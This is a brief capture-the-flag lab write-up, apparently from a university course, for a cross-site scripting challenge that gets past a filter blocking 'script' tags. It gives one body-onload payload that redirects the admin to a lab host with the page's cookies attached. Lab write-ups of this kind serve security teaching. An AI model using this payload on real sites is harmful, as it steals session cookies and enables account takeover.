# Challenge `Give me more than a simple WAF` writeup

- Vulnerability: Cross-Site Scripting Lab (XSS)

- Where: feedback_link input through search input (lure admin)

- Impact: attacker is able to inject malicious code in the webpage in order to get other's person cookies

---

## Steps to reproduce

1. Exactly the same logic as the previous challenge, so use the previous code, but now use 'body' instead of 'script', since 'script' is blocked
2. With 'body' you will now have to put the code inside an onload function, like this:
- < body onload="window.location.href = 'http://nexus.rnl.tecnico.ulisboa.pt:PORT/?cookie='.concat(encodeURIComponent(document.cookie))">


[(POC)](Give_me_more_than_a_simple_WAF.txt)

